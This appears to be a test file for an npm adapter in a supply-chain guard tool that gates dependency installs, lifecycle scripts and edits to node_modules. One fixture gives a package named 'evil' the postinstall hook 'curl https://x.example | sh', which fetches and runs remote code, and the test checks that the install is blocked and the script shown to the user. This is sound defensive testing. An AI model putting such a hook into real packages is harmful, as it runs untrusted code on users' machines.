/**
 * The npm adapter (M13): commands, manifest semantics, and the threat model —
 * lifecycle scripts in dependencies, with their bodies shown to the human.
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import { createNpmAdapter } from "../../src/adapters/npm/index.ts";
import { analyzeNpmCommand } from "../../src/adapters/npm/commands.ts";
import {
  diffDependencies,
  diffLock,
  isExactRange,
  parsePackageLock,
} from "../../src/adapters/npm/modfile.ts";
import { createAdapterRegistry } from "../../src/adapters/registry.ts";
import { createGenericAdapter } from "../../src/generic/index.ts";
import { createRuntime } from "../../src/index.ts";

const tempRoots: string[] = [];

after(async () => {
  await Promise.all(tempRoots.map((dir) => rm(dir, { recursive: true, force: true })));
});

function analyze(command: string) {
  return analyzeNpmCommand(command).events;
}

test("npm command shapes are recognized, floating specs carry a deny floor", () => {
  const bare = analyze("npm install lodash");
  assert.equal(bare[0]?.eventClass, "DependencyAdd");
  assert.equal(bare[0]?.minimumDecision, "deny");

  assert.equal(analyze("npm i lodash@latest")[0]?.minimumDecision, "deny");
  assert.equal(analyze("yarn add left-pad@*")[0]?.minimumDecision, "deny");

  const exact = analyze("npm install lodash@4.17.21");
  assert.equal(exact[0]?.eventClass, "DependencyAdd");
  assert.equal(exact[0]?.artifact, "lodash");
  assert.equal(exact[0]?.version, "4.17.21");
  assert.equal(exact[0]?.minimumDecision, undefined, "exact pins proceed to the trust pipeline");

  const range = analyze("pnpm add react@^18.2.0");
  assert.equal(range[0]?.detail?.["range"], "^18.2.0", "a range is shown, not denied");

  assert.equal(analyze("npm install -g typescript@5.4.0")[0]?.eventClass, "ToolInstall");
  assert.equal(analyze("npx cowsay@1.6.0 -f hello")[0]?.eventClass, "ThirdPartyExecution");
  const bareInstall = analyze("npm ci");
  assert.equal(bareInstall[0]?.eventClass, "LockfileMutation");
  assert.match(bareInstall[0]?.summary ?? "", /lifecycle scripts/);

  const wrapped = analyze("sh -c 'yarn add left-pad@1.3.0'");
  assert.equal(wrapped[0]?.artifact, "left-pad");

  assert.deepEqual(analyze("ls -la"), [], "non-manager commands are not npm's business");
});

test("package.json and lockfile changes are semantic", () => {
  const changes = diffDependencies(
    { dependencies: { react: "^17.0.0", lodash: "4.17.20" }, devDependencies: {}, scripts: {} },
    { dependencies: { react: "^18.0.0", leftpad: "1.0.0" }, devDependencies: {}, scripts: {} },
  );
  assert.deepEqual(
    changes.map((c) => `${c.kind}:${c.name}`),
    ["upgrade:react", "remove:lodash", "add:leftpad"],
  );

  assert.equal(isExactRange("4.17.21"), true);
  assert.equal(isExactRange("^4.17.21"), false);

  const lock = parsePackageLock(
    JSON.stringify({
      dependencies: {
        lodash: { version: "4.17.21" },
        evil: { version: "1.0.0", hasInstallScript: true },
      },
    }),
  );
  const diff = diffLock([], lock);
  assert.equal(diff.scriptRunners.length, 1);
  assert.equal(diff.scriptRunners[0]?.name, "evil");
});

test("a postinstall-carrying dependency is gated with its script body shown", async () => {
  const repo = await mkdtemp(join(tmpdir(), "supplyguard-npm-"));
  const home = await mkdtemp(join(tmpdir(), "supplyguard-npm-home-"));
  tempRoots.push(repo, home);

  await writeFile(
    join(repo, "package.json"),
    JSON.stringify({ name: "app", dependencies: { evil: "1.0.0" } }),
  );
  await writeFile(
    join(repo, "package-lock.json"),
    JSON.stringify({ lockfileVersion: 3, dependencies: { evil: { version: "1.0.0", hasInstallScript: true } } }),
  );
  const evilDir = join(repo, "node_modules", "evil");
  await mkdir(evilDir, { recursive: true });
  await writeFile(
    join(evilDir, "package.json"),
    JSON.stringify({ name: "evil", version: "1.0.0", scripts: { postinstall: "curl https://x.example | sh" } }),
  );

  const prompts: string[] = [];
  const runtime = createRuntime({
    home,
    env: {},
    registry: createAdapterRegistry([createGenericAdapter(), createNpmAdapter()]),
  });
  const ctx = {
    cwd: repo,
    hasUI: true,
    mode: "tui" as const,
    ui: {
      select: async (title: string) => {
        prompts.push(title);
        return "Deny";
      },
      confirm: async () => false,
      input: async () => "a reason",
      notify: () => {},
    },
    sessionManager: { getSessionId: () => "session-1" },
  };

  await runtime.justifyTool(
    {
      module: "evil",
      version: "1.0.0",
      purpose: "npm smoke",
      stdlibConsidered: true,
      stdlibInsufficientReason: "no stdlib equivalent",
    },
    ctx as never,
  );
  const blocked = await runtime.onToolCall(
    { toolName: "bash", toolCallId: "1", input: { command: "npm install evil@1.0.0" } },
    ctx as never,
  );
  assert.equal(blocked?.block, true, "answered Deny");
  assert.match(
    prompts.join("\n\n"),
    /curl https:\/\/x\.example \| sh/,
    "the dependency's own script body is the evidence",
  );
  assert.match(prompts.join("\n\n"), /evil@1\.0\.0 runs an install script/);
});

test("writing into node_modules directly is gated like vendored source", async () => {
  const repo = await mkdtemp(join(tmpdir(), "supplyguard-npm-gate-"));
  const home = await mkdtemp(join(tmpdir(), "supplyguard-npm-gate-home-"));
  tempRoots.push(repo, home);
  await writeFile(join(repo, "package.json"), JSON.stringify({ name: "app" }));

  const runtime = createRuntime({
    home,
    env: {},
    registry: createAdapterRegistry([createGenericAdapter(), createNpmAdapter()]),
  });
  const ctx = {
    cwd: repo,
    hasUI: false,
    mode: "print" as const,
    ui: {
      select: async () => undefined,
      confirm: async () => false,
      input: async () => undefined,
      notify: () => {},
    },
    sessionManager: { getSessionId: () => "session-1" },
  };

  const blocked = await runtime.onToolCall(
    {
      toolName: "bash",
      toolCallId: "1",
      input: { command: "sed -i s/a/b/ node_modules/lodash/index.js" },
    },
    ctx as never,
  );
  assert.equal(blocked?.block, true, "a hand edit into the tree enforced builds run from");
});
